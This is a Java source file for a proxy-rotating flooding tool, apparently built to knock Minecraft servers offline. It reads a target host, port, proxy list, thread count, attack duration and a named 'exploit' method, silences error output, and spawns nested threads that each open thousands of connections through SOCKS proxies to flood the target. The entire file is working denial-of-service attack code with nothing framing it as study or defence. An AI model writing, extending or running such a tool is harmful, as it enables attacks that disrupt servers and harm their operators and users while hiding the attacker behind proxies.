package asmr.dev_.dbv2;

import asmr.dev_.dbv2.options.ArgSplit;
import asmr.dev_.dbv2.options.ProxyLoader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;

public class Main {
    private final ArgSplit options;
    private final ProxyLoader proxies = new ProxyLoader();
    private int maxConnections = -1;
    private int failed = 0;
    private int timed = 0;
    String host = "";
    int port = 25565;
    private final Flooders flooders = new Flooders();

    public Main(ArgSplit options) {
        this.options = options;
    }

    public void start() throws IOException {
        host = (String) this.options.getOption("host", "127.0.0.1");
        if (!this.options.isOption("host")) {
            System.out.println("No \"host\" option provided!");
            System.exit(1);
        }
        port = (Integer) this.options.getOption("port", 25565);
        if (!this.options.isOption("port")) {
            System.out.println("No \"port\" option provided!");
            System.exit(1);
        }
        String proxiesFile = (String) this.options.getOption("proxiesFile", "proxies.txt");
        if (!this.options.isOption("proxiesFile")) {
            System.out.println("No \"proxiesFile\" option provided!");
            System.exit(1);
        }
        int threads = (Integer) this.options.getOption("threads", 1000);
        if (!this.options.isOption("threads")) {
            System.out.println("No \"threads\" option provided!");
            System.exit(1);
        }
        int attackTime = (Integer) this.options.getOption("attackTime", 100);
        if (!this.options.isOption("attackTime")) {
            System.out.println("No \"attackTime\" option provided!");
            System.exit(1);
        }
        String floodName = String.valueOf(this.options.getOption("exploit", "join"));
        if (!this.options.isOption("exploit")) {
            System.out.println("No \"exploit\" option provided!");
            System.exit(1);
        }
        proxies.init(proxiesFile, Proxy.Type.SOCKS);
        Flooders.Flooder var23 = this.flooders.findById(String.valueOf(floodName));
        if (var23 == null) {
            System.out.println("No Method called -> " + floodName + " list of methods -> " + this.flooders.getAsmr_exploits().toString());
            System.exit(1);
        } else {
            for (int i = 0; i < 2; i++) {
                try {
                    //remove Warnings.
                    System.err.close();
                    System.setErr(System.out);
                    String var24 = "unkown";
                    InetAddress[] finalPort = InetAddress.getAllByName(host);
                    int start = finalPort.length;

                    for (int var18 = 0; var18 < start; ++var18) {
                        InetAddress resolved = finalPort[var18];

                        try {
                            Socket socks = new Socket();
                            socks.connect(new InetSocketAddress(var24 = resolved.getHostAddress(), port), 800);
                            socks.getOutputStream().write(0);
                        } catch (Exception var21) {
                            continue;
                        }
                    }
                    host = var24;
                } catch (Exception var22) {
                }
            }
            //attack Time
            (new Thread(() -> {
                try {
                    Thread.sleep(1000L * (long) attackTime);
                } catch (Exception var2) {
                } System.exit(-1);
            })).start();
            this.maxConnections = threads * 8169;
            for (int j21 = 0; j21 < threads; ++j21) {
                Thread conc = new Thread(() -> {
                    for (int j2 = 0; j2 < threads; ++j2) {
                        Thread exp_conc = new Thread(() -> {
                            try {
                                String newServerName;
                                int newServerPort;
                                {
                                    newServerName = host;
                                    newServerPort = port;
                                }
                                for (int i = 0; i < 8169; ++i) {
                                    try {
                                        Proxy proxy = this.proxies.nextProxy();
                                        Socket socket = proxy.type() == Proxy.Type.HTTP
                                                ? new SocketHTTP(proxy.address(), 300)
                                                : new Socket(proxy);
                                        try {
                                            Method m = socket.getClass().getDeclaredMethod("getImpl");
                                            m.setAccessible(true);
                                            Object sd = m.invoke(socket);
                                            m = sd.getClass().getDeclaredMethod("setV4");
                                            m.setAccessible(true);
                                            m.invoke(sd);

                                        } catch (Throwable var17) {
                                        }
                                        if (!(socket instanceof SocketHTTP)) {
                                            socket.connect(new InetSocketAddress(newServerName, newServerPort),
                                                    300);
                                        }
                                        DataOutputStream out = new DataOutputStream(socket.getOutputStream());
                                        var23.flood(out, newServerName, newServerPort);
                                        socket.close();

                                    } catch (Exception var18) {
                                        ++this.failed;
                                        if (var18.getMessage().contains("reply")) {
                                            ++this.timed;
                                        }
                                    }
                                }
                            } catch (Exception var19) {
                            }
                        });
                        exp_conc.setPriority(10);
                        exp_conc.start();
                    }
                });
                conc.setPriority(10);
                conc.start();
            }
        }
    }
}



